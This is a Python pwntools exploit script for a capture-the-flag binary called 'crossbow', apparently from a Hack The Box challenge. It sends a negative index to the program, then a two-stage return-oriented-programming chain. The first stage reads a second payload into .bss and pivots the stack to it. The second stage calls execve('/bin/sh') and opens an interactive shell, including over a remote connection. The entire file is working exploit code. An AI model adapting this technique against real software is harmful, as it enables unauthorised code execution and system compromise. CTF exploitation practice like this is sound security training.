#!/usr/bin/env python3

from pwn import *

e = ELF("./crossbow_patched")
# libc = elf('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(training+0x7e)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # TL;DR: first payload to read the second payload which includes the /bin/sh and execve() into the .bss

    r.sendlineafter(b':', b'-2')
    rop = ROP(e)
    syscall_ret = rop.find_gadget(['syscall', 'ret'])[0]
    stage_1 = flat(
            # read the /bin/sh from the user
            b'\x90' * 8, # garbage for "pop rbp"
            rop.rdi[0], 0,
            rop.rsi[0], e.bss(),
            rop.rdx[0], 0x80,
            rop.rax[0], 0,
            syscall_ret,
            rop.rsp[0], e.bss() + 8,
            )
    r.recvuntil(b'>')
    r.sendline(stage_1)

    stage_2 = flat(
            b'/bin/sh\x00',
            # execve
            rop.rdi[0], e.bss(),
            rop.rsi[0], 0,
            rop.rdx[0], 0,
            rop.rax[0], 59,
            syscall_ret,
            )
    r.sendline(stage_2)

    r.interactive()

if __name__ == "__main__":
    main()
